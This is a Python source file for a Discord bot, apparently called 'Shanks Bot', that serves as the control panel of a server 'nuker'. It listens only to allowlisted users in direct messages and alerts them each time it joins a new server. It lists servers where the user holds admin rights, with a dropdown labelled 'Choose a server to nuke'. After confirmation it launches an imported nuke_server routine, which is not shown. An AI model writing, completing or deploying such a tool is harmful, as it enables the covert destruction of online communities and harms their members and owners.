import os
import asyncio
import discord
from discord.ext import commands
from discord import ui
from dotenv import load_dotenv
from utils import get_admin_guilds, format_guild_list
from nuker import nuke_server

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
ALLOWED_USERS = [int(x.strip()) for x in os.getenv("ALLOWED_USERS", "").split(",") if x.strip().isdigit()]
WHITELIST_SERVER_ID = int(os.getenv("WHITELIST_SERVER_ID", 0))

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Remove default help command
bot.remove_command("help")

# ------------------ Auto message on guild join ------------------
@bot.event
async def on_guild_join(guild):
    """Send a beautiful message to all allowed users when bot joins a new server."""
    embed = discord.Embed(
        title="🎉 New Server Joined!",
        description=f"Successfully joined **{guild.name}** (ID: `{guild.id}`)",
        color=discord.Color.green()
    )
    embed.add_field(name="Members", value=guild.member_count)
    embed.add_field(name="Owner", value=guild.owner.mention if guild.owner else "Unknown")
    embed.set_footer(text="Shanks Bot is ready to serve.")

    for user_id in ALLOWED_USERS:
        user = bot.get_user(user_id)
        if user:
            try:
                await user.send(embed=embed)
            except:
                pass

# ------------------ On message (only allowed users) ------------------
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.author.id not in ALLOWED_USERS:
        return
    if not isinstance(message.channel, discord.DMChannel):
        return
    await bot.process_commands(message)

# ------------------ Dropdown for server selection ------------------
class ServerSelect(ui.Select):
    def __init__(self, guilds, author):
        options = []
        for g in guilds:
            label = g.name[:100]  # max 100 chars
            description = f"{g.member_count} members"
            options.append(ui.SelectOption(label=label, value=str(g.id), description=description))
        super().__init__(placeholder="Choose a server to nuke...", options=options, min_values=1, max_values=1)
        self.guilds = guilds
        self.author = author

    async def callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author.id:
            await interaction.response.send_message("❌ You can't use this menu.", ephemeral=True)
            return

        guild_id = int(self.values[0])
        guild = bot.get_guild(guild_id)
        if not guild:
            await interaction.response.send_message("❌ Server not found.", ephemeral=True)
            return

        # Check whitelist again (just in case)
        if guild.id == WHITELIST_SERVER_ID:
            await interaction.response.send_message("🛡️ This server is whitelisted. Impossible to nuke.", ephemeral=True)
            return

        # Confirm
        await interaction.response.send_message(f"⚠️ Are you sure you want to nuke **{guild.name}**? Type `YES` in this DM within 30 seconds to confirm.", ephemeral=False)

        def check(m):
            return m.author == interaction.user and m.channel == interaction.channel and m.content == "YES"

        try:
            msg = await bot.wait_for("message", check=check, timeout=30)
        except asyncio.TimeoutError:
            await interaction.followup.send("❌ Nuke cancelled (timeout).")
            return

        await interaction.followup.send(f"🔥 Starting nuke on **{guild.name}**... This may take a while.")
        # Start nuke in background
        asyncio.create_task(nuke_server(guild, bot, interaction.user))

class ServerSelectView(ui.View):
    def __init__(self, guilds, author):
        super().__init__(timeout=120)
        self.add_item(ServerSelect(guilds, author))

# ------------------ Commands ------------------
@bot.command(name="list")
async def list_servers(ctx):
    """List all servers where you have Admin (except whitelisted) and provide dropdown."""
    admin_guilds = await get_admin_guilds(bot, ctx.author)
    if not admin_guilds:
        await ctx.send("❌ You don't have Administrator permission in any server (except whitelisted).")
        return

    # Send formatted list + dropdown
    formatted = format_guild_list(admin_guilds)
    await ctx.send(f"📋 **Servers you can nuke:**\n{formatted}\n\nSelect one below:")
    view = ServerSelectView(admin_guilds, ctx.author)
    await ctx.send("Choose a server:", view=view)

# ------------------ Error handler ------------------
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ Missing argument. Use `!list` to see servers.")
    else:
        await ctx.send(f"❌ An error occurred: {error}")
        raise error

# ------------------ Run bot ------------------
if __name__ == "__main__":
    bot.run(TOKEN)
